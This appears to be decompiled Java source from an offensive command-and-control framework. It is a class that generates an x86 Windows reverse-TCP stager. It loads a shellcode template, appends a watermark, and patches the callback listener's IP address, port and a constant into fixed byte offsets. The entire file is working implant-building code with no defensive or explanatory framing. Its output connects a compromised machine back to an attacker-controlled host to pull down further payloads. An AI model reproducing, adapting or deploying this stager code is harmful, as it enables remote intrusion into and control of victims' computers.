package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;
import graph.Route;

public class ForeignReverseStagerX86 extends GenericStager {
   public ForeignReverseStagerX86(ScListener var1) {
      super(var1);
   }

   public String arch() {
      return "x86";
   }

   public String payload() {
      return "windows/foreign/reverse_tcp";
   }

   public byte[] generate() {
      String var1 = CommonUtils.bString(CommonUtils.readResource("resources/reverse.bin")) + this.getConfig().getWatermark();
      long var2 = Route.ipToLong(this.getListener().getStagerHost());
      Packer var4 = new Packer();
      var4.addInt((int)var2);
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 197);
      var4 = new Packer();
      var4.little();
      var4.addInt(1453503984);
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 229);
      var4 = new Packer();
      var4.addShort(this.getListener().getPort());
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 204);
      return CommonUtils.toBytes(var1);
   }
}
